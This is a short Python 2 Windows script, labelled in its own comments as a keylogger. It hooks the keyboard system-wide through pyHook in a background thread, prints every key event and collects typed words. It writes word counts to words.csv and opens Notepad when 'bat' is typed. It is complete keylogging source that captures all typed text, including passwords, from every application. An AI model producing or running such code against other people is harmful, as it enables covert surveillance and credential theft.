#Imorts for threading
import threading
import os

#Imports and variables for keylogger
import win32api 
import sys
import pythoncom, pyHook 
log = ''
lastSentence = ''
sentenceBefore = ''
sentence = ''
cont = True
words = []
wordsFound = {}
uppercase = {'A': 'a', 'B': 'b', 'C': 'c',
             'D': 'd', 'E': 'e', 'F': 'f',
             'G': 'g', 'H': 'h', 'I': 'i',
             'J': 'j', 'K': 'k', 'L': 'l',
             'M': 'm', 'N': 'n', 'O': 'o',
             'P': 'p', 'Q': 'q', 'R': 'r',
             'S': 's', 'T': 't', 'U': 'u',
             'V': 'v', 'W': 'w', 'X': 'x',
             'Y': 'y', 'Z': 'z'}
alphabet = {'a': 'a', 'b': 'b', 'c': 'c',
             'd': 'd', 'e': 'e', 'f': 'f',
             'g': 'g', 'h': 'h', 'i': 'i',
             'j': 'j', 'k': 'k', 'l': 'l',
             'm': 'm', 'n': 'n', 'o': 'o',
             'p': 'p', 'q': 'q', 'r': 'r',
             's': 's', 't': 't', 'u': 'u',
             'v': 'v', 'w': 'w', 'x': 'x',
             'y': 'y', 'z': 'z'}

#Function to be called with every new key press
def OnKeyboardEvent(event):
  global log, sentence, lastSentence
  sentenceNew = ''
  print event
  sentenceNew += chr(event.Ascii)
  try:
    uppercase[sentenceNew]
    sentenceNew = uppercase[sentenceNew]
  except:
    try:
      alphabet[sentenceNew]
      sentence += sentenceNew
    except:
      if sentenceNew == ' ' or sentenceNew == '\n':
        try:
          wordsFound[sentence]
          wordsFound[sentence]+=1
          print 'Word: ', sentence
          print 'Iteration: ', wordsFound[sentence]
        except:
          wordsFound.update({sentence: 1})
          words.append(sentence)
          print 'Word: ', sentence
          print 'Iteration: ', wordsFound[sentence]
        log = open('words.csv', 'w');
        output = ""
        for i in words:
          output += i + "," + str(wordsFound[i]) + '\n'
        log.write(output)
        sentence = ''
  '''
  if not sentenceNew == ' ':
    sentence += sentenceNew
  else:
    try:
      wordsFound[sentence]
      wordsFound[sentence]+=1
      print 'Word: ', sentence
      print 'Iteration: ', wordsFound[sentence]
    except:
      wordsFound.update({sentence: 1})
      words.append(sentence)
      print 'Word: ', sentence
      print 'Iteration: ', wordsFound[sentence]
    sentence = ''
    '''

#Function to begin keylogging indefinitely
def getAllKeys():
	hm = pyHook.HookManager() 
	hm.KeyDown = OnKeyboardEvent 
	hm.HookKeyboard() 
	pythoncom.PumpMessages()
	hm.UnhookKeyboard()

keyThread = threading.Thread(target=getAllKeys)
keyThread.daemon = True
keyThread.start()

while True:
  if not sentenceBefore == sentence:
    if sentence == 'bat':
      os.startfile('C:/Windows/notepad.exe')
    sentenceBefore = sentence



